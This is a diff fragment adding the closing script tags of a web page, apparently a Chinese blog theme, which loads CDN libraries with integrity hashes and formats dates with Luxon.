+<script src="https://cdn.jsdelivr.net/npm/overlayscrollbars@1.13.1/js/jquery.overlayScrollbars.min.js" integrity="sha256-tBd38uWlvgfps3zHPrUb2ePBg+Z8EjMf0QloFONzpvU=" crossorigin="anonymous"></script>
+<script src="/js/header.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/theme.js"></script>
+
+    
+
+
+<script src="https://cdn.jsdelivr.net/npm/luxon@1.26.0" integrity="sha256-4sbTzmCCW9LGrIh5OsN8V5Pfdad1F1MwhLAOyXKnsE0=" crossorigin="anonymous"></script>
+<script>
+  format()
+
+  function format() {
+    $('span[data-format="luxon"]').each(function () {
+      var date = $(this).text()
+
+      $(this).text(luxon.DateTime.fromISO(date, { locale: "zh" }).toFormat("yyyy年MM月dd日"))
+    })
+  }
+</script>
+
+
+
+<script src="/js/scrollToTop.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.1/dist/html2canvas.min.js" integrity="sha256-uacRffSSMP9qpvNWhVmYLykBv9YKMA1d/VSIN1AmfyQ=" crossorigin="anonymous"></script>
+<script src="/js/post.js" defer></script>
+
+
+    
+
+    
+  </body>
+</html>
